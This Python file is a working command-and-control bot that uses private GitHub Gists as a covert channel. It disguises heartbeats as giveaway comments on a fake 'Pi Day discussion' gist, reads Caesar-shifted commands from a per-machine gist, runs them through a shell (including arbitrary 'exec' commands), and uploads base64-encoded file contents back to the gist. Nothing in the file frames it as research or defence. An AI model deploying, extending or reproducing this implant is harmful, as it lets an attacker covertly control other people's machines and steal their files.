from names_generator import generate_name
from dotenv import load_dotenv
import subprocess
import requests
import uuid
import os

caesar_constant = 128013

luck = ["DIGIT, good luck everyone!",
        "DIGIT, good luck! 🍀",
        "DIGIT thanks for the giveaway!",
        "My favorite number is DIGIT because it's the date of my wedding anniversary!",
        "I'm going to go with DIGIT because it's my lucky number for the month.",
        "I think I'll choose DIGIT because it's the number of days I've been alive.",
        "DIGIT is the number of miles I've run this year, so I'm going with that one.",
        "DIGIT, thanks!",
        "I will choose DIGIT, my lucky number 😀 good luck everyone!",
        "DIGIT but I never win... good luck anyways",
        ]

pi_day_discussion_body = "Hi everyone! I'm excited for Pi Day next month. I was thinking about creating a contest to see who can come up with the most creative and unique way to represent the number pi. It could be a drawing, a poem, a song, or anything else you can think of. 🎉 The winner will receive a prize, so get creative and let's have some fun! 🤗 If you have any ideas or want to join in, just leave a comment below. Can't wait to see what everyone comes up with!\n\nAlso, and as a way to celebrate, we will be giving away 5 t-shirts! You only have to leave a comment of the format `🟢 271303656225123`, where the number will be your unique identifier. We will reduce all numbers to modulo $10^\{14\}\pi$ so think about that when choosing a number 🧠\n\nGood luck!"

def hex_to_pretty_mac(mac):
    mac = hex(int(mac)).split('x')[1].zfill(12)
    return ':'.join(''.join(x) for x in zip(*[iter(mac)]*2))

def caesar_encrypt(text, k):
    return ''.join(chr((ord(ch) + k) % 0x10FFFF) for ch in text)

def caesar_decrypt(ciphertext, k):
    return ''.join(chr((ord(ch) - k) % 0x10FFFF) for ch in ciphertext)

def main():
    heartbeat()
    check_pending_commands()

load_dotenv()
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")

base_url = "https://api.github.com/gists"

base_headers = {
    "Accept": "application/vnd.github+json",
    "Authorization": "Bearer " + GITHUB_TOKEN,
    "X-GitHub-Api-Version": "2022-11-28"
}

def get_gists():
    response = requests.get(base_url, headers=base_headers)
    return response.json()

def get_gist(gist_id):
    response = requests.get(base_url + "/" + gist_id, headers=base_headers)
    return response.json()

def get_gist_id_from_description(description):
    gists = get_gists()
    for gist in gists:
        if description in gist["description"]:
            return gist["id"]

def put_file_on_gist(gist_id, file_name, content):
    response = requests.patch(base_url + "/" + gist_id, headers=base_headers, json={"files": {file_name: {"content": str(content)}}})
    return response.json()

def create_gist(description, body, file_name=None):
    file_name = file_name if file_name != None else description.split(' ')[1].lower() + ".md"
    data = {
        "description": description,
        "public": False,
        "files": {
            file_name: {
                "content": body
            }
        }
    }

    response = requests.post(base_url, headers=base_headers, json=data)
    return response.status_code, response.reason

def get_comments(gist_id, cipher=True):
    response = requests.get(base_url + "/" + gist_id +
                            "/comments", headers=base_headers)
    json = response.json()

    if cipher:
        for c in json:
            c['body'] = caesar_decrypt(
                c['body'], caesar_constant)

    return json

def create_comment(gist_id, comment, cipher=True):
    body = caesar_encrypt(comment, caesar_constant) if cipher else comment
    response = requests.post(base_url + "/" + gist_id + "/comments", headers=base_headers, json={"body": body})
    return response.json()

def update_comment(gist_id, comment_id, comment, cipher=True):
    body = caesar_encrypt(comment, caesar_constant) if cipher else comment
    response = requests.patch(base_url + "/" + str(gist_id) + "/comments/" + str(comment_id), headers=base_headers, json={"body": body})
    return response.json()

def heartbeat(): 
    mac = str(uuid.getnode())

    alive_gist_id = get_gist_id_from_description("Pi Day discussion") 

    # Create the gist if it does not exist
    if not alive_gist_id:
        create_gist("Pi Day discussion", pi_day_discussion_body, file_name="pi.md")
        alive_gist_id = get_gist_id_from_description("Pi Day discussion")
        
    comments = get_comments(alive_gist_id, cipher=False) 

    if any(mac in (match := comment)["body"] for comment in comments): 

        has_trailing_space = match["body"].endswith(" ")
        message = match["body"][:-1] if has_trailing_space else match["body"] + " "
        update_comment(alive_gist_id, match["id"], message, cipher=False)
    else:
        random_message = luck[int(mac) % len(luck)]
        create_comment(alive_gist_id, random_message.replace("DIGIT", mac), cipher=False)

mac = str(uuid.getnode()) 
name = generate_name(seed=mac) 

def process_command(command):
    os_command = ""

    if command == "w":
        os_command = "w"
    elif command == "id":
        os_command = "id"
    elif command.startswith("ls"):
        path = command.replace("ls ","")
        os_command = f"ls {path}"
    elif command.startswith("cp"):
        remote_path = command.replace("cp ","")

        os_command = f"cat {remote_path} | base64"
    elif command.startswith("exec"):
        binary_path = command.replace("exec ","")
        os_command= f"{binary_path}"
    else:
        return ("Command not recognized")

    proc = subprocess.run(os_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = proc.stdout.decode('utf-8')
    stderr = proc.stderr.decode('utf-8')

    return stdout + stderr, stderr != '' 

def check_pending_commands():

    humanized_name = name.replace("_", " ").title()
    my_gist_id = get_gist_id_from_description(humanized_name) or None

    if my_gist_id is None:
        return

    comments = get_comments(my_gist_id)

    not_answered_comments = list(filter(lambda x: not x['body'].startswith('>') 
    and x['body'].startswith('⏱️')
    , comments))

    for comment in not_answered_comments:
        command = comment['body'].replace("⏱️ ","")

        output, has_error = process_command(command)

        MAX_COMMENT_LENGTH = 65535
        if (command.startswith("cp") or len(output) > MAX_COMMENT_LENGTH) and not has_error:
            file_name = command.split("/")[-1].replace("\"","")

            file_name = caesar_encrypt(file_name, caesar_constant)

            response = put_file_on_gist(my_gist_id, file_name, output)
            file_url = response["files"][file_name]["raw_url"]
            output = f"📎 [{file_name}]({file_url})"

        command = f"{'❌' if has_error else '✅'} {command}"[:MAX_COMMENT_LENGTH] 
        update_comment(my_gist_id, comment["id"], command) 
        create_comment(my_gist_id,f"> {command}\r\n\r\n{output}") 

if __name__ == "__main__":
    main()
